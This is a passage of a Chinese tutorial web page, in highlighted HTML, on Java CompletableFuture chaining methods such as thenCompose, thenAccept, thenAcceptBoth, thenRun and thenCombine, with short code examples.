    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenCompose</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">CompletionStage</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> param<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token annotation punctuation">@Override</span>
                <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">int</span> number <span class="token operator">=</span> param <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> number<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果: "</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么 <code>thenApply </code>和<code>thenCompose </code>有何区别呢：</p>
<ul>
<li><code>thenApply </code>转换的是泛型中的类型，返回的是同一个CompletableFuture；</li>
<li><code>thenCompose</code> 使用上一个CompletableFutre 调用的结果在下一步的 CompletableFuture 调用中进行运算，是生成一个内部构造的新的CompletableFuture。</li>
</ul>
<p>下面用一个例子对对比：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">,</span> <span class="token class-name">ExecutionException</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result1 <span class="token operator">=</span> future<span class="token punctuation">.</span><span class="token function">thenApply</span><span class="token punctuation">(</span>param <span class="token operator">-&gt;</span> param <span class="token operator">+</span> <span class="token string">" World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result2 <span class="token operator">=</span> future<span class="token punctuation">.</span><span class="token function">thenCompose</span><span class="token punctuation">(</span>param <span class="token operator">-&gt;</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> param <span class="token operator">+</span> <span class="token string">" World"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="结果消费（Consumer）">结果消费（Consumer）</h3>
<p>与结果处理和结果转换系列函数返回一个新的 CompletableFuture 不同，结果消费系列函数只对结果执行Action，而<font color="red">不返回新的计算值</font>。</p>
<p>根据对结果的处理方式，结果消费函数又分为：</p>
<ul>
<li><code>thenAccept</code>系列：对单个结果进行消费</li>
<li><code>thenAcceptBoth</code>系列：对两个结果进行消费</li>
<li><code>thenRun</code>系列：不关心结果，只对结果执行Action</li>
</ul>
<h4 id="thenAccept">thenAccept</h4>
<p>通过观察该系列函数的参数类型可知，它们是函数式接口Consumer，这个接口只有输入，没有返回值。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAccept</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAcceptAsync</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAcceptAsync</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String<span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span> <span class="token class-name">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture<span class="token punctuation">&lt;</span>Void<span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> CompletableFuture<span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token class-name"><span class="token keyword">int</span></span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> number<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenAccept</span><span class="token punctuation">(</span>number <span class="token operator">-&gt;</span> System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    System<span class="token punctuation">.</span><span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果："</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="thenAcceptBoth">thenAcceptBoth</h4>
<p>thenAcceptBoth 函数的作用是，当两个 CompletionStage 都正常完成计算的时候，就会执行提供的action，消费两个异步的结果。没有返回值。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAcceptBoth</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAcceptBothAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenAcceptBothAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span><span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> futrue1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第二阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> number<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    futrue1<span class="token punctuation">.</span><span class="token function">thenAcceptBoth</span><span class="token punctuation">(</span>future2<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> x<span class="token punctuation">,</span> <span class="token class-name">Integer</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果："</span> <span class="token operator">+</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="thenRun">thenRun</h4>
<p>thenRun 也是对线程任务结果的一种消费函数，与thenAccept不同的是，thenRun 会在上一阶段 CompletableFuture 计算完成的时候执行一个Runnable，但是不使用该 CompletableFuture 计算的结果。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenRun</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenRunAsync</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> action<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenRunAsync</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> action<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第一阶段："</span> <span class="token operator">+</span> number<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> number<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenRun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"thenRun 执行"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果："</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="结果组合">结果组合</h3>
<h4 id="thenCombine">thenCombine</h4>
<p>thenCombine 方法，合并两个线程任务的结果，并进一步处理。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenCombine</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span> <span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenCombineAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span> <span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenCombineAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> other<span class="token punctuation">,</span> <span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">U</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">,</span><span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
